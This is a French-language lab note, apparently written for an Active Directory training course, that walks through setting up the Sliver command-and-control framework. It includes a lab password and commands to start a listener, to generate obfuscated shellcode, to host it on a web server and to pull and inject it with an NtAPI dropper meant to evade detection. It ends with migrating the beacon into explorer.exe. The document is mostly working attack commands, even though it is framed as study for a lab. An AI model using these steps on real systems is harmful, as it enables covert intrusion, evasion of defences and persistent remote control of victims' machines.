# Sliver - Setup et beacons

> [!summary] Objectif
> Monter l'infrastructure C2 et obtenir un premier beacon sur le foothold : serveur Sliver sous WSL, listener de sortie (HTTPS ici), génération d'un implant shellcode obfusqué, livraison par un dropper NtAPI, puis stabilisation de la session par migration de processus. C'est le socle de tout le reste. Théorie : [[Qu'est-ce que Sliver]], [[Workflow Sliver]].

### Démarrer le serveur Sliver (WSL)

```bash
cd /mnt/c/AD/Tools/Sliver
sudo ./sliver-server            # mot de passe WSL du lab : WSLToTh3Rescue!
```

Le serveur tourne sous Linux (recommandé par les auteurs). Sur le foothold `dcorp-stdX`, une WSL Ubuntu est fournie pour ça.

### Démarrer un listener de sortie

```bash
[server] sliver > https          # listener HTTPS :443
[server] sliver > jobs           # lister les listeners actifs
```

Sliver supporte plusieurs canaux de callback : `mtls`, `https`, `dns`, WireGuard. HTTPS/mTLS pour la furtivité, DNS pour les réseaux verrouillés.

### Générer un implant (shellcode obfusqué)

```bash
[server] sliver > generate -b https://172.16.100.X -e -f shellcode -N dcorp-std_https -s ./Implants/dcorp-std_https.bin
```

`-b` beacon vers l'adresse du foothold, `-e` active l'obfuscation (symboles + encodage shikata-ga-nai), `-f shellcode` sort du shellcode brut à injecter, `-N` nom de l'implant, `-s` fichier de sortie. Le beacon rappelle périodiquement (contrairement à une session interactive).

### Livrer le shellcode

```bash
# Héberger les implants depuis un webserver
cd /mnt/c/AD/Tools/Sliver/Implants
python3 -m http.server 8080
```

```powershell
# Sur le foothold : dropper NtAPI (BinLoader / NtDropper) qui télécharge + injecte le shellcode
C:\AD\Tools\Sliver\BinLoader.exe 172.16.100.X 8080 dcorp-std_https.bin
```

`BinLoader.exe <IP> <Port> <Filename>` récupère le shellcode hébergé et l'exécute par injection via des NtAPI (évite les détections classiques). Une nouvelle session apparaît côté serveur.

### Prendre la main sur la session / le beacon

```bash
[server] sliver > sessions                 # lister
[server] sliver > use <session-id>          # activer une session
[server] sliver (dcorp-std_https) > whoami  # vérifier le contexte
[server] sliver > beacons                   # lister les beacons
```

### Stabiliser : migrer vers un processus fiable

```bash
[server] sliver (dcorp-std_https) > ps -e explorer.exe     # trouver un hôte stable
[server] sliver (dcorp-std_https) > migrate -p 6744        # migrer dans ce PID
[server] sliver (dcorp-std_https) > use <new-session-id>
```

Migrer vers un processus stable et durable (`explorer.exe`) donne une session résiliente et un bon parent pour les futures injections `execute-assembly`. Voir [[w. Sliver C2/Sliver - Exécution et évasion]].

> [!note] Beacon vs session
> Un **beacon** rappelle à intervalles (discret, asynchrone). Une **session** est interactive/temps réel (pratique mais plus bruyante). On passe de l'un à l'autre selon le besoin ; les commandes de tasking sont les mêmes.

## Related
- [[w. Sliver C2/Sliver - Exécution et évasion]]
- [[Workflow Sliver]]
- [[Sliver - Toutes les commandes]]
- [[Sliver - Index]]
